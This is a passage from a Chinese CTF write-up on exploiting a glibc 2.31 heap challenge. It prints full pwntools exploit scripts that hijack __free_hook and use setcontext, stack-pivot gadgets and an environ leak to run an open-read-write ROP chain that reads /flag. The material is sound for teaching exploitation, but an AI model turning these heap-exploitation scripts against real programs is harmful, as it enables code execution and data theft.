0x20]</span><br></pre></td></tr></table></figure><p>这个<code>gadget</code>可以通过<code>rdi</code>来控制<code>rdx</code>，控制了<code>rdx</code>，我们就可以通过<code>setcontext</code>来控制其他寄存器，比如很重要的<code>rsp</code>等等</p><p>几个疑惑的点就是，一开始不知道为什么要<code>gadget</code>和<code>setcontext</code>这些指令，认为直接<code>orw</code>一把梭就行，其实这样是没法控制<code>rsp</code>，所以当你<code>ret</code>的时候就会有问题。</p><p>那么思路就是劫持<code>free_hook</code>为<code>gadget</code>，利用<code>call    qword [rdx + 0x20]</code>来跳转到<code>setcontext</code>来控制<code>rsp</code>等寄存器，之后再执行<code>orw</code>就行。</p><p>看一下关键部分的调试</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13607520853/0" alt="image-20210603114453858"></p><p>可以看到此时我们的<code>free_hook</code>已经劫持为我们的gadget，并且我们已经控制了<code>rdx</code>从而使<code>call</code>指令能够跳转到<code>setcontext</code>来执行</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13607526697/0" alt="image-20210603114610939"></p><p>在<code>setcontext</code>执行完之后，就可以执行我们的<code>orw</code>了</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;2.31/libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,sex,name</span>):</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(sex))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">idx,name</span>):</span></span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s new name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_con</span>(<span class="params">idx,des</span>):</span></span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s description:&quot;</span>,des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resex</span>(<span class="params">idx</span>):</span></span><br><span class="line">menu(<span class="number">666</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)    </span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x7f0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base= &quot;</span>+<span class="built_in">hex</span>(heap_base)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base= &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;setcontext= &quot;</span>+<span class="built_in">hex</span>(setcontext)</span><br><span class="line">gadget = libc_base + <span class="number">0x154930</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x000000000011c371</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000005aa48</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x00154930      mov     rdx, qword [rdi + 8]</span></span><br><span class="line"><span class="string">0x00154934      mov     qword [rsp], rax</span></span><br><span class="line"><span class="string">0x00154938      call    qword [rdx + 0x20]</span></span><br><span class="line"><span class="string">&lt;setcontext+61&gt;     mov    rsp, qword ptr [rdx + 0xa0]</span></span><br><span class="line"><span class="string">&lt;setcontext+68&gt;     mov    rbx, qword ptr [rdx + 0x80]</span></span><br><span class="line"><span class="string">&lt;setcontext+75&gt;     mov    rbp, qword ptr [rdx + 0x78]</span></span><br><span class="line"><span class="string">&lt;setcontext+79&gt;     mov    r12, qword ptr [rdx + 0x48]</span></span><br><span class="line"><span class="string">&lt;setcontext+83&gt;     mov    r13, qword ptr [rdx + 0x50]</span></span><br><span class="line"><span class="string">&lt;setcontext+87&gt;     mov    r14, qword ptr [rdx + 0x58]</span></span><br><span class="line"><span class="string">&lt;setcontext+91&gt;     mov    r15, qword ptr [rdx + 0x60]</span></span><br><span class="line"><span class="string">&lt;setcontext+95&gt;     test   dword ptr fs:[0x48], 2</span></span><br><span class="line"><span class="string">&lt;setcontext+107&gt;    je     setcontext+294 </span></span><br><span class="line"><span class="string">&lt;setcontext+294&gt;    mov    rcx, qword ptr [rdx + 0xa8]</span></span><br><span class="line"><span class="string">&lt;setcontext+301&gt;    push   rcx</span></span><br><span class="line"><span class="string">&lt;setcontext+294&gt;:mov    rcx,QWORD PTR [rdx+0xa8]</span></span><br><span class="line"><span class="string">&lt;setcontext+301&gt;:push   rcx</span></span><br><span class="line"><span class="string">&lt;setcontext+302&gt;:mov    rsi,QWORD PTR [rdx+0x70]</span></span><br><span class="line"><span class="string">&lt;setcontext+306&gt;:mov    rdi,QWORD PTR [rdx+0x68]</span></span><br><span class="line"><span class="string">&lt;setcontext+310&gt;:mov    rcx,QWORD PTR [rdx+0x98]</span></span><br><span class="line"><span class="string">&lt;setcontext+317&gt;:mov    r8,QWORD PTR [rdx+0x28]</span></span><br><span class="line"><span class="string">&lt;setcontext+321&gt;:mov    r9,QWORD PTR [rdx+0x30]</span></span><br><span class="line"><span class="string">&lt;setcontext+325&gt;:mov    rdx,QWORD PTR [rdx+0x88]</span></span><br><span class="line"><span class="string">&lt;setcontext+332&gt;:xor    eax,eax</span></span><br><span class="line"><span class="string">&lt;setcontext+334&gt;:ret</span></span><br><span class="line"><span class="string">0x0000000000026b72 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000027529 : pop rsi ; ret </span></span><br><span class="line"><span class="string">0x000000000011c371 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x000000000005aa48 : leave ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>,<span class="string">&#x27;\x00\x00\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">rename(<span class="number">6</span>,p64(heap_base+<span class="number">0x4b0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">edit_con(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(heap_base+<span class="number">0xD50</span>)+<span class="string">&#x27;/flag\x00\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">rename(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,p64(gadget))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(setcontext)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(heap_base+<span class="number">0x820</span>)+p64(pop_rdi)</span><br><span class="line">edit_con(<span class="number">8</span>,payload)</span><br><span class="line">orw = p64(pop_rdi)+p64(heap_base+<span class="number">0x4d0</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(<span class="built_in">open</span>)</span><br><span class="line">orw += p64(pop_rdi)+p64(<span class="number">4</span>)+p64(pop_rsi)+p64(heap_base+<span class="number">0x500</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(read)</span><br><span class="line">orw += p64(pop_rdi)+p64(heap_base+<span class="number">0x500</span>)+p64(puts)</span><br><span class="line">edit_con(<span class="number">5</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>*<span class="number">3</span>+orw)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="解法二-Gadget-栈迁移"><a href="#解法二-Gadget-栈迁移" class="headerlink" title="解法二 Gadget+栈迁移"></a>解法二 Gadget+栈迁移</h3><p>因为要进行栈迁移，所以上一种解法的<code>gadget</code>肯定是没法用的，栈迁移肯定是需要控制<code>rbp</code>的，那么用到的<code>gadget</code>如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00157d8a      mov     rbp, qword [rdi + 0x48]</span><br><span class="line">0x00157d8e      mov     rax, qword [rbp + 0x18]</span><br><span class="line">0x00157d92      lea     r13, [rbp + 0x10]</span><br><span class="line">0x00157d96      mov     dword [rbp + 0x10], 0</span><br><span class="line">0x00157d9d      mov     rdi, r13</span><br><span class="line">0x00157da0      call    qword [rax + 0x28]</span><br></pre></td></tr></table></figure><p>剩下其实也是堆风水的事了，但是这里有一个注意的点是，最后执行orw的时候会发现跟前面的<code>payload</code>的地方会有重复，所以这里有了点小trick，就是下面这个</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00026b69      pop     rbx</span><br><span class="line">0x00026b6a      pop     rbp</span><br><span class="line">0x00026b6b      pop     r12</span><br><span class="line">0x00026b6d      pop     r13</span><br><span class="line">0x00026b6f      pop     r14</span><br><span class="line">0x00026b71      pop     r15</span><br><span class="line">0x00026b73      ret</span><br></pre></td></tr></table></figure><p>利用这个把栈往高地址抬之后，就能跳过那段有冲突的地方，之后再写入orw就行了</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;2.31/libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,sex,name</span>):</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(sex))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">idx,name</span>):</span></span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s new name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_con</span>(<span class="params">idx,des</span>):</span></span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s description:&quot;</span>,des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resex</span>(<span class="params">idx</span>):</span></span><br><span class="line">menu(<span class="number">666</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)    </span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x7f0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base= &quot;</span>+<span class="built_in">hex</span>(heap_base)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base= &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gadget = libc_base + <span class="number">0x157d8a</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x000000000011c371</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000005aa48</span></span><br><span class="line">pop6 = libc_base + <span class="number">0x00026b69</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x00157d8a      mov     rbp, qword [rdi + 0x48]</span></span><br><span class="line"><span class="string">0x00157d8e      mov     rax, qword [rbp + 0x18]</span></span><br><span class="line"><span class="string">0x00157d92      lea     r13, [rbp + 0x10]</span></span><br><span class="line"><span class="string">0x00157d96      mov     dword [rbp + 0x10], 0</span></span><br><span class="line"><span class="string">0x00157d9d      mov     rdi, r13</span></span><br><span class="line"><span class="string">0x00157da0      call    qword [rax + 0x28]</span></span><br><span class="line"><span class="string">0x0000000000026b72 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000027529 : pop rsi ; ret </span></span><br><span class="line"><span class="string">0x000000000011c371 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x000000000005aa48 : leave ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>,<span class="string">&#x27;\x00\x00\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">rename(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,p64(gadget))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">edit_con(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(heap_base+<span class="number">0x5e0</span>)+<span class="string">&#x27;/flag\x00\x00&#x27;</span>)</span><br><span class="line">orw = p64(pop_rdi)+p64(heap_base+<span class="number">0x510</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(<span class="built_in">open</span>)</span><br><span class="line">orw += p64(pop_rdi)+p64(<span class="number">4</span>)+p64(pop_rsi)+p64(heap_base+<span class="number">0x750</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(read)</span><br><span class="line">orw += p64(pop6)</span><br><span class="line">edit_con(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(pop6)+p64(<span class="number">0</span>)+p64(heap_base+<span class="number">0x600</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(pop6)+p64(leave_ret)+p64(<span class="number">0</span>)*<span class="number">5</span>+orw)</span><br><span class="line">payload = p64(pop_rdi)+p64(heap_base+<span class="number">0x750</span>)+p64(puts)</span><br><span class="line">edit_con(<span class="number">4</span>,p64(<span class="number">0</span>)+payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#chunk_ptr = 0x5555555580a0</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="解法三-利用environ来泄露栈地址覆盖返回地址"><a href="#解法三-利用environ来泄露栈地址覆盖返回地址" class="headerlink" title="解法三 利用environ来泄露栈地址覆盖返回地址"></a>解法三 利用environ来泄露栈地址覆盖返回地址</h3><p>这种思路就非常的简单，我们泄露了<code>environ</code>变量保存的栈地址后经过调试就可以知道<code>main</code>函数的返回地址于我们泄露的地址之间的偏移之后将堆块申请过去即可覆盖返回地址</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13610298945/0" alt="image-20210603211324175"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13610299476/0" alt="image-20210603211333929"></p><p>可以看到此时我们已经输出了Bye，我们的<code>main</code>函数即将返回，此时我们可以算出相差<code>0x100</code></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13610302718/0" alt="image-20210603211437417"></p><p>将返回地址覆盖为orw即可</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13610305048/0" alt="image-20210603211522052"></p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;2.31/libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,sex,name</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(sex))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">idx,name</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s new name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_con</span>(<span class="params">idx,des</span>):</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s description:&quot;</span>,des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resex</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">666</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)    </span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">show(<span 